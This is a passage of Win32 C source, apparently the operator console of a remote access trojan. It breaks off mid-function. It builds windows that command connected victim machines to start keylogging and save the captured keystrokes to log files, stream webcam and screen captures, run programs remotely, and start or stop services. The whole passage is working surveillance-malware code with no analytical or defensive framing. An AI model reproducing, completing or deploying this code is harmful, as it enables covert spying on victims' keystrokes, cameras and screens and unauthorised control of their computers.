			 MoveWindow(GetDlgItem(hwnd, IDC_TAB2),0,0,rc.right, rc.bottom - 20, TRUE);
			 //MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
			break;
			case WMSZ_TOPLEFT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS),0,0,rc.right, rc.bottom - 40, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS2),0,0,rc.right, rc.bottom - 40, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_TASK_STATUS),0,rc.bottom - 10,rc.right, 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_TAB2),0,0,rc.right, rc.bottom - 20, TRUE);

			// MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
			break;
			case WMSZ_TOPRIGHT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS),0,0,rc.right, rc.bottom - 40, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS2),0,0,rc.right, rc.bottom - 40, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_TASK_STATUS),0,rc.bottom - 10,rc.right, 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_TAB2),0,0,rc.right, rc.bottom - 20, TRUE);

			 //MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
			break;
			}
			break;
	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
		case  IDC_TEXTNORMAL:
  
		memset( &cc, 0, sizeof(CHOOSECOLOR) );
		cc.lStructSize = sizeof(CHOOSECOLOR);
		cc.hwndOwner = hwnd;
		cc.lpCustColors = dwColors;
		cc.Flags = CC_RGBINIT;
		cc.rgbResult = dwTextColor;

		if( ! ChooseColor( &cc ) )
		return( FALSE );

		dwTextColor = cc.rgbResult;        
		 break;

        case  IDC_TIME:
  
		memset( &cc, 0, sizeof(CHOOSECOLOR) );
		cc.lStructSize = sizeof(CHOOSECOLOR);
		cc.hwndOwner = hwnd;
		cc.lpCustColors = dwColors;
		cc.Flags = CC_RGBINIT;
		cc.rgbResult = dwTimeColor;

		if( ! ChooseColor( &cc ) )
		return( FALSE );

		dwTimeColor = cc.rgbResult;
         
		 break;
		case  IDC_WINDOWTEXT:
  
		memset( &cc, 0, sizeof(CHOOSECOLOR) );
		cc.lStructSize = sizeof(CHOOSECOLOR);
		cc.hwndOwner = hwnd;
		cc.lpCustColors = dwColors;
		cc.Flags = CC_RGBINIT;
		cc.rgbResult = dwTitleColor;

		if( ! ChooseColor( &cc ) )
		return( FALSE );

		dwTitleColor = cc.rgbResult;

		 memset( &cf, 0, sizeof(CHARFORMAT) );
		 cf.cbSize = sizeof(CHARFORMAT);
		 cf.dwMask = CFM_COLOR;
		 cf.crTextColor = dwTextColor;
         
		 break;
		case  IDC_BACKGROUND:
  
		memset( &cc, 0, sizeof(CHOOSECOLOR) );
		cc.lStructSize = sizeof(CHOOSECOLOR);
		cc.hwndOwner = hwnd;
		cc.lpCustColors = dwColors;
		cc.Flags = CC_RGBINIT;
		cc.rgbResult = dwBackColor;

		if( ! ChooseColor( &cc ) )
		return( FALSE );

		 dwBackColor = cc.rgbResult;

		 SendDlgItemMessage( hwnd, IDC_KEYS, EM_SETBKGNDCOLOR, FALSE, dwBackColor );
         break;

		case IDCANCEL:
			if(MessageBox(NULL, "Would you like to save Logs?", "Save", MB_YESNO | MB_ICONQUESTION) == IDYES)
			{
			GetWindowText(hwnd, WindowOut, 10);
			WindowOutY[0] = WindowOut[0];
			Head.ID = atoi(WindowOutY);
			dwFileSize = GetWindowTextLength (GetDlgItem(hwnd, IDC_KEYS));
			pszFileText = (char *)GlobalAlloc(GPTR, dwFileSize + 1);
			GetWindowText(GetDlgItem(hwnd, IDC_KEYS), pszFileText, dwFileSize);
			GetTime();
			strcat(FileNameA, WindowOutY);
			strcat(FileNameA, ".txt");
			
			FileHandle = CreateFile (FileNameA, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
			WriteFile(FileHandle, pszFileText, strlen(pszFileText), &numb_bytes, NULL);

				
			        Head.PacketType = PACKET_KEYLOGGER_OFF;
					SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);
					EndDialog(hwnd,Select);
			}
					
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
			        Head.PacketType = PACKET_KEYLOGGER_OFF;
					SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);
					KeyHwnd[Head.ID] = NULL;
					EndDialog(hwnd,Select);
					break;
		}

//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}
HINSTANCE KeyLogInst;
DWORD WINAPI KeyLogWindow(LPVOID lpParam)
{
	FileStruct * FILEWINDOW = (FileStruct *)lpParam;
	char WindowText [50] = "";
	char COMPUTER [50] = "";
	int ID = GID;
	char IDA [10] = "";
	HICON hIcon;

	strcpy(COMPUTER, WINDOWIP);

	KeyHwnd[ID]=CreateDialog(KeyLogInst,(LPCTSTR)IDD_KEYLOG,NULL,(DLGPROC)KeyLogProc);
	ShowWindow(KeyHwnd[ID],SW_SHOW);
	ShowWindow(GetDlgItem(KeyHwnd[ID], IDC_ID),SW_HIDE);
	InitCommonControls();

	ZeroMemory(&WindowText[0],10);
	sprintf(&WindowText[0],"Keylogger | %s", COMPUTER);
	sprintf(IDA, "%d", ID);
	
	SetWindowText(KeyHwnd[ID], WindowText);
	SetWindowText(GetDlgItem(KeyHwnd[ID], IDC_ID), IDA);
	Head.PacketType = PACKET_KEYLOGGER;
	SentKb+=send(Client[ID],(char*)&Head,HeadSize,0);

	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 16, 16, 0);
	SendMessage(KeyHwnd[ID], WM_SETICON,ICON_SMALL,(LPARAM)hIcon);
	DeleteObject(hIcon);
	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 32, 32, 0);
	SendMessage(KeyHwnd[ID], WM_SETICON,ICON_BIG,(LPARAM)hIcon);

	MSG msg;
	while(GetMessage(&msg,KeyHwnd[ID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

return 0;
}
/////////////////////////////////////////////////////////////////////////////////////////////////
//WebCam
LRESULT CALLBACK CamProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	int Select;
	char WindowOut  [10] = "";
	char WindowOutY [10] = "";
	char Title [50] = "";
	int FG = 0;
 	RECT rc;    // client area    
	HBITMAP Final;
	HDC hdcBackground;
	INT ndcBackground;
	HDC hdc = 0;
	HDC hdcScreen;
	
	PAINTSTRUCT ps;
	HBITMAP hbmMem;
	INT ndcMem;
	HDC hdcMem;


	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
			 SendMessage(GetDlgItem(hwnd,IDC_PROGRESS1), PBM_SETPOS , (WPARAM)0, 0);
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGRESS1),0,rc.bottom - 10,rc.right, 10, TRUE);
			 MoveWindow(hwnd,0,0,300, 290, TRUE);
			
	case WM_PAINT:
			{
		GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
		Head.ID = atoi(WindowOut);
		Final =  WebA[Head.ID];
	    GetClientRect(hwnd, (LPRECT) &rc);
        if(Final == NULL) return -1;
		hdcScreen = GetDC(HWND_DESKTOP);
    	hdcBackground = CreateCompatibleDC(hdcScreen);
		ndcBackground = SaveDC(hdcBackground);
		SelectObject(hdcBackground, Final);
		ReleaseDC(HWND_DESKTOP, hdcScreen); 
			if(BeginPaint(hwnd, &ps)) 
			{
					// Create double buffer
					hdcMem = CreateCompatibleDC(ps.hdc);
					ndcMem = SaveDC(hdcMem);
					hbmMem = CreateCompatibleBitmap(ps.hdc, rc.right, rc.bottom - 10);
					SelectObject(hdcMem, hbmMem);
				
					// Copy background bitmap into double buffer
			     	if(BitBlt(hdcMem, 0, 0, rc.right, rc.bottom - 10, hdcBackground, 0, 0, SRCCOPY) == NULL)
					{
					//MessageBox(NULL, "failed", "FAILED", MB_OK);
					}
					//StretchBlt(ps.hdc, 0, 0, rc.right, rc.bottom - 10, hdcMem,  0, 0,  ID3, ID4, SRCCOPY);
					//Copy double buffer to screen
				    if(BitBlt(ps.hdc, 0, 0, rc.right, rc.bottom - 10, hdcMem, 0, 0, SRCCOPY) == NULL)
					{
					//	MessageBox(NULL, "failed Screen", "FAILED", MB_OK);
					 }

					// Clean up
				    RestoreDC(hdcMem, ndcMem);
					DeleteObject(hbmMem);
					DeleteObject(Final);
					DeleteDC(hdcMem);
					DeleteDC(hdcScreen);
					DeleteDC(hdc);
					EndPaint(hwnd, &ps);
			}
			break;
			}
		case WM_SIZING:
			switch(wParam)
			{
			case WMSZ_BOTTOM:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGRESS1),0,rc.bottom - 10,rc.right, 10, TRUE);
			break;
			case WMSZ_BOTTOMLEFT:
			GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGRESS1),0,rc.bottom - 10,rc.right, 10, TRUE);
			break;
			case WMSZ_BOTTOMRIGHT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGRESS1),0,rc.bottom - 10,rc.right, 10, TRUE);
			break;
			case WMSZ_LEFT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGRESS1),0,rc.bottom - 10,rc.right, 10, TRUE);
            break;
			case WMSZ_RIGHT:
             GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGRESS1),0,rc.bottom - 10,rc.right, 10, TRUE);
			break;
			case WMSZ_TOP:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGRESS1),0,rc.bottom - 10,rc.right, 10, TRUE);
			break;
			case WMSZ_TOPLEFT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGRESS1),0,rc.bottom - 10,rc.right, 10, TRUE);
			break;
			case WMSZ_TOPRIGHT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGRESS1),0,rc.bottom - 10,rc.right, 10, TRUE);
			break;
			}
			break;
			
	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
		case IDCANCEL:
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
					Screen[Head.ID] = NULL;
					EndDialog(hwnd,Select);
					break;
		}

//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}
DWORD WINAPI CamWindow(LPVOID lpParam)
{
	FileStruct * FILEWINDOW = (FileStruct *)lpParam;
	char WindowText [50] = "";
	char COMPUTER [50] = "";
	int LID = atoi(FILEWINDOW->ID);
//	RECT rc;

	strcpy(COMPUTER, WINDOWIP);
   
	HICON hIcon;

	WebCam[LID]=CreateDialog(CamInst,(LPCTSTR)IDD_WEBCAM,NULL,(DLGPROC)CamProc);
	ShowWindow(WebCam[LID],SW_SHOW);
	ShowWindow(GetDlgItem(WebCam[LID], IDC_ID),SW_HIDE);
	InitCommonControls();

	ZeroMemory(&WindowText[0],10);
	sprintf(&WindowText[0],"WebCam View | %s", COMPUTER);
	sprintf(ID, "%d", LID);
	
	SetWindowText(WebCam[LID], WindowText);
	SetWindowText(GetDlgItem(WebCam[LID], IDC_ID), ID);	
	    
	Head.PacketType = WEBCAM_CAPTURE;
	SentKb+=send(Client[LID],(char*)&Head,HeadSize,0);

	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 16, 16, 0);
	SendMessage(WebCam[LID], WM_SETICON,ICON_SMALL,(LPARAM)hIcon);
	DeleteObject(hIcon);
	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 32, 32, 0);
	SendMessage(WebCam[LID], WM_SETICON,ICON_BIG,(LPARAM)hIcon);

	MSG msg;
	while(GetMessage(&msg,WebCam[LID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

return 0;
}
/////////////////////////////////////////////////////////////////////////////////////////////////
//Screen Window
LRESULT CALLBACK ScreenProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	int Select;
	char WindowOut  [10] = "";
	char WindowOutY [10] = "";
	char Title [50] = "";
	int FG = 0;
 	RECT rc;    // client area    
	HBITMAP Final;
	HDC hdcBackground;
	INT ndcBackground;
	HDC hdc = 0;
	HDC hdcScreen;
	
	PAINTSTRUCT ps;
	HBITMAP hbmMem;
	INT ndcMem;
	HDC hdcMem;


	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
SendMessage(GetDlgItem(hwnd, IDC_SLIDER1), TBM_SETRANGEMIN,TRUE, 2);
SendMessage(GetDlgItem(hwnd, IDC_SLIDER1), TBM_SETRANGEMAX,TRUE, 100);
SendMessage(GetDlgItem(hwnd, IDC_SLIDER1), TBM_SETPOS,TRUE, 75);
SendMessage(GetDlgItem(hwnd,IDC_PROGRESS), PBM_SETPOS , (WPARAM)0, 0);
		
			 GetClientRect(hwnd, &rc);
	    	 MoveWindow(GetDlgItem(hwnd, IDC_SLEEP),rc.right - 25,rc.bottom - 25,25, 25, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGRESS),0,rc.bottom - 10,rc.right - 25, 20, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_SLIDER1),rc.right - 25,0,rc.right - 10,rc.bottom - 25, TRUE);
			 
		GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			break;
	case WM_PAINT:
			{
		
		GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
		Final =  ScreenA[atoi(WindowOut)];
	    GetClientRect(hwnd, (LPRECT) &rc);
        if(Final == NULL) return -1;
		hdcScreen = GetDC(HWND_DESKTOP);
    	hdcBackground = CreateCompatibleDC(hdcScreen);
		ndcBackground = SaveDC(hdcBackground);
		SelectObject(hdcBackground, Final);
		ReleaseDC(HWND_DESKTOP, hdcScreen); 
			if(BeginPaint(hwnd, &ps)) 
			{/////////////////////////Screen1
					// Create double buffer
					hdcMem = CreateCompatibleDC(ps.hdc);
					ndcMem = SaveDC(hdcMem);
					hbmMem = CreateCompatibleBitmap(ps.hdc, rc.right - 20, rc.bottom - 10);
					SelectObject(hdcMem, hbmMem);
				
					// Copy background bitmap into double buffer
			     	if(BitBlt(hdcMem, 0, 0, rc.right - 20, rc.bottom - 10, hdcBackground, 0, 0, SRCCOPY) == NULL)
					{
					//MessageBox(NULL, "failed", "FAILED", MB_OK);
					}
					//StretchBlt(ps.hdc, 0, 0, rc.right, rc.bottom - 10, hdcMem,  0, 0,  ID3, ID4, SRCCOPY);
					//Copy double buffer to screen
				    if(BitBlt(ps.hdc, 0, 0, rc.right - 20, rc.bottom - 10, hdcMem, 0, 0, SRCCOPY) == NULL)
					{
					//	MessageBox(NULL, "failed Screen", "FAILED", MB_OK);
					 }

					// Clean up
				    RestoreDC(hdcMem, ndcMem);
					DeleteObject(hbmMem);
					DeleteObject(Final);
					DeleteDC(hdcMem);
					DeleteDC(hdcScreen);
					DeleteDC(hdc);
					EndPaint(hwnd, &ps);
			}
			break;
			}
		case WM_SIZING:
			 GetClientRect(hwnd, &rc);
	    	 MoveWindow(GetDlgItem(hwnd, IDC_SLEEP),rc.right - 25,rc.bottom - 25,25, 25, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGRESS),0,rc.bottom - 10,rc.right - 25, 20, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_SLIDER1),rc.right - 25,0,rc.right - 10,rc.bottom - 25, TRUE);
	         break;

	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
		case IDCANCEL:
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
					WebCam[Head.ID] = NULL;
					EndDialog(hwnd,Select);
					break;
		}

//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}

DWORD WINAPI ScreenWindow(LPVOID lpParam)
{
	FileStruct * FILEWINDOW = (FileStruct *)lpParam;
	char WindowText [50] = "";
	char COMPUTER [50] = "";
	int LID = atoi(FILEWINDOW->ID);
	RECT rc;

	strcpy(COMPUTER, WINDOWIP);
   
	HICON hIcon;

	Screen[LID]=CreateDialog(ScreenInst,(LPCTSTR)IDD_SCREEN,NULL,(DLGPROC)ScreenProc);
	ShowWindow(Screen[LID],SW_SHOW);
	ShowWindow(GetDlgItem(Screen[LID], IDC_ID),SW_HIDE);
	InitCommonControls();

	ZeroMemory(&WindowText[0],10);
	sprintf(&WindowText[0],"Screen View | %s", COMPUTER);
	sprintf(ID, "%d", LID);
	
	SetWindowText(Screen[LID], WindowText);
	SetWindowText(GetDlgItem(Screen[LID], IDC_ID), ID);	
	
	GetClientRect(Screen[LID], (LPRECT) &rc);
	Head.PacketType = SCREEN_CAPTURE;
	Head.ID3 = SendMessage(GetDlgItem(Screen[LID], IDC_SLIDER1), TBM_GETPOS,NULL,NULL);
	Head.ID2 = rc.right - 25;
	sprintf(Head.IDS, "%d", rc.bottom - 10);
    
	Head.ID3 = SendMessage(GetDlgItem(Screen[LID], IDC_SLIDER1), TBM_GETPOS,NULL,NULL);
	SentKb+=send(Client[LID],(char*)&Head,HeadSize,0);

	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 16, 16, 0);
	SendMessage(Screen[LID], WM_SETICON,ICON_SMALL,(LPARAM)hIcon);
	DeleteObject(hIcon);
	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 32, 32, 0);
	SendMessage(Screen[LID], WM_SETICON,ICON_BIG,(LPARAM)hIcon);

	MSG msg;
	while(GetMessage(&msg,Screen[LID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

return 0;
}
/////////////////////////////////////////////////////////////////////////////////////////////////
//Set Search
void SetSearch(char * Path, int ID)
{
	LV_ITEM	item;
    item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;

	item.iSubItem=0;
	item.pszText=Path;
	item.iItem=ListView_InsertItem(GetDlgItem(FileHwnd[ID],IDC_SEARCHLIST),&item);

}
/////////////////////////////////////////////////////////////////////////////////////////////////
//Apps manager
void SetProg(char * Prog, char * Path , int ID)
{
	LV_ITEM	item;
    item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;

	item.iSubItem=0;
	item.pszText=Prog;
	item.iImage = 10; 
	item.iItem=ListView_InsertItem(GetDlgItem(ProgHwnd[ID],IDC_PROGS),&item);
	
	item.iSubItem=1;
	item.pszText=Path;
	
	ListView_SetItem(GetDlgItem(ProgHwnd[ID],IDC_PROGS),&item);

}
LRESULT CALLBACK ProgProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	int Select;
	char WindowOut  [10] = "";
	char WindowOutY [10] = "";
	char Title [50] = "";
	int I = 0;
	int FG = 0;
	LV_COLUMN	col;
	LV_ITEM		item;
    POINT  pt;   // location of mouse click 
    HMENU hmenu;
	HMENU hmenuTrackPopup;
	RECT rc;
	TCITEM tie;
//	HGLOBAL hMem;
//	LPTSTR sMem;
switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
				
	tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "Program's";
	
	TabCtrl_InsertItem(GetDlgItem(hwnd, IDC_TAB4), 0, &tie);

	tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "Service's";
	
	TabCtrl_InsertItem(GetDlgItem(hwnd, IDC_TAB4), 1, &tie);

		ShowWindow(GetDlgItem(hwnd, IDC_SERVICES ),SW_HIDE);

			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGS),0,30,rc.right, rc.bottom - 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,30,rc.right, rc.bottom - 10, TRUE);


		ListView_SetImageList(GetDlgItem(hwnd, IDC_PROGS),hImageList, LVSIL_SMALL);
		ListView_SetExtendedListViewStyle(GetDlgItem(hwnd,IDC_PROGS),LVS_EX_FULLROWSELECT |LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH;

		col.cx=120;
		col.pszText="Program";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_PROGS),0,&col);

		col.cx=225;
		col.pszText="Install Path";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_PROGS),1,&col);

		ListView_SetExtendedListViewStyle(GetDlgItem(hwnd,IDC_SERVICES),LVS_EX_FULLROWSELECT |LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=100;

		col.pszText="Service Name";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_SERVICES),0,&col);
		col.cx=100;

		col.pszText="Display Name";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_SERVICES),1,&col);
		col.cx=100;

		col.pszText="Status";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_SERVICES),2,&col);
		col.cx=100;
		
		col.pszText="Startup";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_SERVICES),3,&col);
		col.cx=100;
		ListView_SetImageList(GetDlgItem(hwnd, IDC_SERVICES),hImageList, LVSIL_SMALL);
		/////////////////////////////////////////////////////////////

	break;

		case WM_SIZING:
			switch(wParam)
			{
			case WMSZ_BOTTOM:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGS),0,30,rc.right, rc.bottom - 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,30,rc.right, rc.bottom - 10, TRUE);
			break;
			case WMSZ_BOTTOMLEFT:
							 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGS),0,30,rc.right, rc.bottom - 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,30,rc.right, rc.bottom - 10, TRUE);
			break;
			case WMSZ_BOTTOMRIGHT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGS),0,30,rc.right, rc.bottom - 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,30,rc.right, rc.bottom - 10, TRUE);
			break;
			case WMSZ_LEFT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGS),0,30,rc.right, rc.bottom - 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,30,rc.right, rc.bottom - 10, TRUE);
            break;
			case WMSZ_RIGHT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGS),0,30,rc.right, rc.bottom - 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,30,rc.right, rc.bottom - 10, TRUE);
			break;
			case WMSZ_TOP:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGS),0,30,rc.right, rc.bottom - 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,30,rc.right, rc.bottom - 10, TRUE);
			break;
			case WMSZ_TOPLEFT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGS),0,30,rc.right, rc.bottom - 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,30,rc.right, rc.bottom - 10, TRUE);
			break;
			case WMSZ_TOPRIGHT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_PROGS),0,30,rc.right, rc.bottom - 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,30,rc.right, rc.bottom - 10, TRUE);
			break;
			}
			break;

case WM_NOTIFY:
		switch(wParam)
		{
		case IDC_TAB4:
            switch (((LPNMHDR)lParam)->code)
            {
            case TCN_SELCHANGE:
                    int iPage = TabCtrl_GetCurSel(GetDlgItem(hwnd, IDC_TAB4)); 
                   switch(iPage)
				   {
					 case 0:
					ShowWindow(GetDlgItem(hwnd, IDC_SERVICES ),SW_HIDE);
					ShowWindow(GetDlgItem(hwnd, IDC_PROGS ),SW_SHOW);
					 break;

					 case 1:
					ShowWindow(GetDlgItem(hwnd, IDC_PROGS ),SW_HIDE);
					ShowWindow(GetDlgItem(hwnd, IDC_SERVICES ),SW_SHOW);
					Head.PacketType = PACKET_SERVICE_MAN;
				    
					if(ListView_GetItemCount(GetDlgItem(hwnd, IDC_SERVICES)) == 0)
					{
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
					strcpy(Head.Data, "");
					SentKb+=send(Client[Head.ID],(char*)&Head,HeadSize,0);
					break;
					}

					 break;
					 
					}
				
				break;
            }
		case IDC_PROGS:

		   if(((LPNMHDR)lParam)->code == NM_RCLICK)  // Right Click
			{
				GetClientRect(hwnd, (LPRECT) &rc); 
 
            // Get the client coordinates for the mouse click.  
			  GetCursorPos(&pt);
			  pt.y += 10;
			  pt.x += 10;
            // If the mouse click took place inside the client 
            // area, execute the application-defined function 
            // that displays the shortcut menu. 
 
        
				 hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_MENU8));

				 if (hmenu == NULL) 
				 {
                  break;
				 }
 
			// Get the first shortcut menu in the menu template. This is the 
			// menu that TrackPopupMenu displays. 
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 
 
              // TrackPopup uses screen coordinates, so convert the 
             // coordinates of the mouse click to screen coordinates. 
 
             //ClientToScreen(hWnd, (LPPOINT) &pt); 
 
            // Draw and track the shortcut menu.  
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, hwnd, NULL); 
			}
			break;
		case IDC_SERVICES:
 if(((LPNMHDR)lParam)->code == NM_RCLICK)  // Right Click
			{
				GetClientRect(hwnd, (LPRECT) &rc); 
 
            // Get the client coordinates for the mouse click.  
			  GetCursorPos(&pt);
			  pt.y += 10;
			  pt.x += 10;
            // If the mouse click took place inside the client 
            // area, execute the application-defined function 
            // that displays the shortcut menu. 
 
        
				 hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_MENU10));

				 if (hmenu == NULL) 
				 {
                  break;
				 }
 
			// Get the first shortcut menu in the menu template. This is the 
			// menu that TrackPopupMenu displays. 
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 
 
              // TrackPopup uses screen coordinates, so convert the 
             // coordinates of the mouse click to screen coordinates. 
 
             //ClientToScreen(hWnd, (LPPOINT) &pt); 
 
            // Draw and track the shortcut menu.  
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, hwnd, NULL); 
			}
			break;

}
		break;
	
	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
		case IDC_EXECUTE_PROG:
				item.iItem=ListView_GetNextItem(GetDlgItem(hwnd,IDC_TASKLIST),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=1;
				item.pszText=Head.Data;
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hwnd,IDC_PROGS),&item);
				GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			    Head.ID = atoi(WindowOut);
								
				Head.PacketType = EXECUTE;
				SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
			break;
		case IDC_REMOVE_PROG:
				
			break;
		case IDC_STOP_SERVICE:
				item.iItem=ListView_GetNextItem(GetDlgItem(hwnd,IDC_SERVICES),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=0;
				item.pszText=Head.Data;
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hwnd,IDC_PROGS),&item);
				
				GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			    Head.ID = atoi(WindowOut);
								
				Head.PacketType = PACKET_SERVICE_STOPA;
				SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
			break;
		case IDC_START_SERVICE:
				item.iItem=ListView_GetNextItem(GetDlgItem(hwnd,IDC_SERVICES),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=0;
				item.pszText=Head.Data;
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hwnd,IDC_SERVICES),&item);

				GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			    Head.ID = atoi(WindowOut);
								
				Head.PacketType = PACKET_SERVICE_STARTA;
				SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
			break;
		case IDCANCEL:
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
